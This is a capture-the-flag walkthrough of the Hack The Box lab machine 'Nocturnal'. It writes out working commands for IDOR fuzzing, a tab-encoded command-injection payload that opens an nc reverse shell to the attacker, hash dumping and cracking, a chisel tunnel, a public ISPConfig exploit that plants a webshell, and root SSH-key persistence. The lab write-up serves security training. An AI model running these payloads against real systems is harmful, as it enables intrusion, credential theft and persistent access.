a walkthrough of the nocturnal machine. enumerate hidden endpoints, abuse an IDOR, and chain it with command injection. crack some creds, pivot through ispconfig, and drop a webshell for root.

# Introduction

**Name:** Nocturnal  
**Platform:** HTB  
**Difficulty:** Easy  
**Challenge type:** Boot2Root machine  
**Challenge author:** FisMatHack  
 
# Recon Phase

i started this machine off with an nmap scan:

`sudo nmap -sC -sV -p- 10.129.46.231 -oA nmap/full-tcp.nmap`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

seems like the typical port 22 and port 80. nothing of note. i'll add the `nocturnal.htb` to my `/etc/hosts`.

`echo "10.129.46.231    nocturnal.htb" | sudo tee -a /etc/hosts`

i'll open up my browser along side caido and navigate to http://nocturnal.htb.

i'm greeted with what seems to be some kind of cloud file storage. i see the option to login or register, so i'll click register.

i'll add my username and password and hit register.

`ax0ryn:password`

now i'm at the login so i'll login with my credentials.

i'm presented with my own dashboard, where we can upload things. i'll create a little dummy text file and capture the upload in caido to see what happens.

`echo "test file" >> test.txt`

i'll upload the file and capture the request in caido.

i see, i need to rename the file to one of the valid file types. i'll just change it in the request to `.pdf` and send it.

nice, the file uploaded, but what's really interesting is the link to view the file.

`view.php?username=ax0ryn&file=test.pdf`

the inclusion of the username is concerning and begs the question, can i find other user accounts files?

i'll test for this 'indirect object reference' (idor) vulnerability by capturing the request in caido and changing the username from ax0ryn to admin.

it replies with "available files for download" and doesn't include my uploaded file, i think its worth the time to fuzz the username parameter to gather another potential username, and even more importantly, another users file. i can do this using ffuf.

`ffuf -w /usr/share/seclists/usernames/xato-net-10-million-usernames.txt -u 'http://nocturnal.htb/view.php?username=fuzz&file=file.pdf' -fs 2985 -b "phpsessid=oo439c3sn20ea6o5ve72qbp3sn"`

```
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 92ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 91ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 95ms]
```

nice! admin, amanda, and tobias are valid users. i already checked to see if admin had any files, what about amanda? i'll resend the request in caido.

`view.php?username=amanda&file=test.pdf`

excellent! i can grab that file by navigating to http://nocturnal.htb/view.php?username=amanda&file=privacy.odt

this is an odt file, i can use odt2txt to view the contents of the file.

odt2txt privacy.odt
```
Dear Amanda,Nocturnal has set the following temporary password for you:
arHkG7HAI68X8s1J. This password has been set for all our
services, so it is essential that you change it on your first
login to ensure the security of your account and our
infrastructure.The file has been created and provided by Nocturnal's IT team.
If you have any questions or need additional assistance during
the password change process, please do not hesitate to contact
us.Remember that maintaining the security of your credentials is
paramount to protecting your information and that of the
company. We appreciate your prompt attention to this matter.

Yours sincerely, Nocturnal's IT team
```

i see the password there. i tried this password in ssh but no joy.

```
ssh amanda@nocturnal.htb
amanda@nocturnal.htb's password: 
permission denied, please try again.
```

i'll try this password to log in as amanda.

it's easy to miss, but at the top left there is an admin panel! i'll click it.

# Exploitation Phase

these php files are cool and all, but i'm more interested in this create backup feature. i'll set a password "123" and click create backup to see what happens.

this looks suspiciously like a console output (stdout). there is potential for rce here. i'll capture the request using caido and see what the password input looks like.

i see the user input in the password field, "123" created the backup, what would happen if i inserted a 123%0aid (%0a new line feed)

`password=123%0aid`

remote code execution in the flesh. i just need to tweak this a bit to get a reverse shell.

after a bit trial and error, i settled on this.

`password=123%0abusybox%09nc%0910.10.14.168%09443%09-e%09%2fbin%2fbash`

it's a url encoded busybox reverse shell, but instead of %20(space) i used %09(tab). i also added the


`sudo nc -lvnp 443`

```
listening on [any] 443 ...
connect to [10.10.14.168] from (unknown) [10.129.46.231] 59766
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
nice, i got a shell as www-data

# Privesc to Tobias

`www-data@nocturnal:~$`

i took a peek in the home directory and noticed the user tobias, i also remembered that tobias was an account on the webserver. this means my focus is to find the webapps db file to try an extract a password for tobias.

after some light recon, i found the db file. it wasn't exactly hidden.

```
www-data@nocturnal:~/nocturnal_database$ ls
nocturnal_database.db
```

no need to do anything fancy, i'll just copy the file to the web root and download it from my browser. `http://nocturnal.htb/nocturnal_database.db`

`www-data@nocturnal:~/nocturnal_database$ cp nocturnal_database.db ../nocturnal.htb/`

i'll check the db file and see that it's a sqlite file.

```
file nocturnal_database.db

nocturnal_database.db: sqlite 3.x database, last written using sqlite version 3031001, file counter 19, database pages 5, cookie 0x2, schema 4, utf-8, version-valid-for 19
```

i can use sqlite3 to dump the user table.

`sqlite3 nocturnal_database.db`

```
sqlite version 3.46.1 2024-08-13 09:16:08
enter ".help" for usage hints.
sqlite> .tables
uploads  users
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0al5|101ad4543a96a7fd84908fd0d802e7db
8|cn0x|62dd5084a03c9358eb1822d33ee94dd3
```

i'll take tobias' hash and paste it into crackstation.

`slowmotionapocalypse`

i'll try this password to login as tobias via ssh.

```
ssh tobias@nocturnal.htb
tobias@nocturnal.htb's password: 
welcome to ubuntu 20.04.6 lts (gnu/linux 5.4.0-212-generic x86_64)
```

neat. i have a shell as tobias. grab the user.txt

```
tobias@nocturnal:~$ cat user.txt
d8d42***************************
```

# Privesc to Root

first i'll do my immediate action of checking for sudo privs

```
tobias@nocturnal:~$ sudo -l
[sudo] password for tobias:
sorry, user tobias may not run sudo on nocturnal.
```

fine, i'll check to see if there are any local applications running

```
tobias@nocturnal:~$ ss -tuln
```
there is a service, potentially a web application running locally on port 8080. i'll have to break out chisel to access it.

i'll start up a python webserver on my attacker and transfer the file to the victim

`sudo python3 -m http.server 80`

victim:

```
tobias@nocturnal:$ wget http://10.10.14.168/chisel
...
tobias@nocturnal:$ chmod +x chisel
```

attacker:

`./chisel server -p 8081 --reverse`

victim:

`tobias@nocturnal:~$ ./chisel client 10.10.14.168:8081 r:8080:127.0.0.1:8080`

now i can navigate to `http://127.0.0.1:8080` and i'm presented with an ispconfig login

i'll try `tobias : slowmotionapocalypse`
didn't work :(( 

now, password reuse is a pretty command vulnerability in the real world, so what if we try a common username like admin? 
`admin : slowmotionapocalypse`

it worked!! 

nice, i did some research and discovered that this is vulnerable to `CVE-2023–46818` https://github.com/ajdumanhug/cve-2023-46818

"this python exploit script targets a security vulnerability in ispconfig's records post parameter to /admin/language_edit.php, which is not properly sanitized. this allows an authenticated admin to inject and execute arbitrary php code."

i'll download this python script and try it out!

`wget https://raw.githubusercontent.com/ajdumanhug/cve-2023-46818/refs/heads/main/cve-2023-46818.py`

```
python3 cve-2023-46818.py http://127.0.0.1:8080 admin slowmotionapocalypse

[+] logging in with username 'admin' and password 'slowmotionapocalypse'
[+] login successful!
[+] fetching csrf tokens...
[+] csrf id: language_edit_36cc7ea52d87a07090f76f31
[+] csrf key: ae6a2d3694a0ae5044315664fa8b45c0b9139fa0
[+] injecting shell payload...
[+] shell written to: http://127.0.0.1:8080/admin/sh.php
[+] launching shell...

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

awesome! i like to finish these with a true tty shell, so i'll copy over a private key.

`ssh-keygen -t rsa`

and copy the public key over.

`ispconfig-shell# echo "ssh-rsa aaaab3nza..." >> /root/.ssh/authorized_keys`

just login as root!

`ssh -i persist root@nocturnal.htb`

```
root@nocturnal:~#
```

and grab the root.txt

```
root@nocturnal:~# cat root.txt
24afa2*********************
```

